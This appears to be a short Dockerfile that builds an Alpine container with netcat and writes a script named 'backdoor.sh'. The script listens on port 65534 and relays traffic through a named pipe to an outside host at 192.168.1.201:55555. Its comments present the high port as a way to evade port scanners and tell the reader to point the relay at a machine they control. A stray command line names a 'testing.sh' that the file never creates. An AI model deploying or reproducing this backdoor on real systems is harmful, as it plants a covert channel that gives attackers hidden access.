# Launch container with docker run -d --rm -p 192.168.1.25:65534:65534 netcat
/bin/sh -c /testing.sh  
FROM alpine:edge  
LABEL maintainer="dastardly0x90@gmail.com"  
RUN apk add --update netcat-openbsd && rm -rf /var/cache/apk/*  
# This exposes a high level port scanners don't easily see. In theory.  
EXPOSE 65534  
# You really need to change netcat's destination to something you control  
RUN /bin/sh -c 'echo "nc -l -p 65534 0<backpipe | nc 192.168.1.201 55555 | tee
backpipe" > backdoor.sh'  
# Let's make a backpipe!  
RUN /bin/sh -c 'mknod backpipe p'  
# Let's make this executable!  
RUN /bin/sh -c 'chmod 555 backdoor.sh'  

